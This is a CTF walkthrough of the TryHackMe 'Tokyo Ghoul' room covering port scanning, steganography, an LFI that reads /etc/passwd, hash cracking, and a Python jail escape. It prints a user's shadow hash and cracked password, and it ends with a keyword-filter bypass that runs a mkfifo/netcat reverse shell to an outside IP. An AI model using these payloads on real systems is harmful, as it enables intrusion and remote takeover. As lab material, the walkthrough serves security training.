---
title: Tokyo Ghoul
date: 2022-12-24 18:32:00 -0500
categories: [Walkthrough, Tryhackme, CTF]
tags: [security, web, hash, lfi]
---

<img src="/assets/tuzTqo4.gif" alt="Tokyo Ghoul"> Help kaneki escape jason room 

# Where am I?

**Use nmap to scan all ports**

- `sudo nmap tokyo.thm -p-`

**How many ports are open?**

- `3`

**What is the OS used?**

- `sudo nmap tokyo.thm -p21,22,80 -sC -sV -sT -O`

# Planning to escape 

**Did you find the note that the others ghouls gave you? where did you find it ?**

- the website

**What is the key for Rize executable?**

- `strings need_to_talk`

**Use a tool to get the other note from Rize.**

- `steghide extract -sf rize_and_kaneki.jpg -p You_found_1t`

# What Rize is trying to say? 

**What the message mean did you understand it ? what it says?**

- `d1r3c70ry_center`

**Can you see the weakness in the dark ? no ? just search**

gobuster we can find a page to lfi in. sending to gobuster and url encoding lets us access /etc/passwd and the user kamishiro's hash

kamishiro:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:1001:1001:,,,:/home/kamishiro:/bin/bash

**What did you find something ? crack it**

john sucks use hashcat

**what is rize username ?**

kamishiro:password123

# Fight Jason

- `sudo -l` first command tried

jail.py 

```
#! /usr/bin/python3
#-*- coding:utf-8 -*-
def main():
    print("Hi! Welcome to my world kaneki")
    print("========================================================================")
    print("What ? You gonna stand like a chicken ? fight me Kaneki")
    text = input('>>> ')
    for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write']:
        if keyword in text:
            print("Do you think i will let you do this ??????")
            return;
    else:
        exec(text)
        print('No Kaneki you are so dead')
if __name__ == "__main__":
    main()
```

Found a python jail escape here that explains on how to get root shell from a python jail https://anee.me/escaping-python-jails-849c65cf306e

can use the following code to send back a root shell.

- `__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.2.3.64 6676 >/tmp/f')`